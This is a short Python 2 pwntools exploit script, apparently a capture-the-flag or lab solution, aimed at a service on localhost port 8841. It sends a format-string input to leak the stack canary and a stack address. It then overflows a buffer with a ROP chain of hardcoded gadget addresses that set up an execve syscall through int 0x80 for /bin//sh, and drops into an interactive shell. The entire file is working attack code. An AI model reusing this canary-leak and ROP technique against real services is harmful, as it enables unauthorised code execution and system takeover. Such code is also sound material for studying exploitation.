from pwn import *
import struct

# context.log_level = 'debug'

p = remote("localhost", 8841)
print 'Process opened'

# raw_input('Press Enter...')

p.sendline('%130$p%p/bin//sh')
wynik = p.recv(512)
# print hexdump(wynik)
kanarek = wynik[0xdf:0xdf+10]
stack = wynik[0xe9:0xea+9]

print 'stack:\t' + stack
print 'canary:\t' + kanarek

eip1 = struct.pack("<L",0x41424344)
# 0x08049c73 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
eip1 = struct.pack("<L",0x08049c73)
# 0x08096f36 : mov eax, 0xc ; pop edi ; ret
eip2 = struct.pack("<L",0x08096f36)
# 0x08064753 : dec eax ; ret
eip3 = struct.pack("<L",0x08064753)
# 0x0806f22a : pop edx ; ret
eip5 = struct.pack("<L",0x0806f22a)
# 0x08048ef6 : int 0x80
eip4 = struct.pack("<L",0x08048ef6)

binsh = struct.pack("<L",0xbfef7760)

# 0x080b9493 : mov edx, ecx ; pop esi ; pop edi ; pop ebp ; ret
eip6 = struct.pack("<L",0x080b9493)

exploit = 'ABCDEFGHIJKLMNOP' + struct.pack("<L",0xdeadbeef) + 'UWXZ' + struct.pack("<L",int(kanarek,16)) + 'DEFG' + eip1 + struct.pack("<L",int(stack,16)+8) +'ABCDEFGHI' + 'UVW' + eip2 + 'XZab' + eip3 + eip6 + 'ABCD' + 'ABCD' + 'CHCH' + eip4 +'cdefghijklmnopqrstuwvxz'

p.sendline('A')
result = p.recv(2048)

p.sendline(exploit)
print 'exploit sent!'

p.interactive()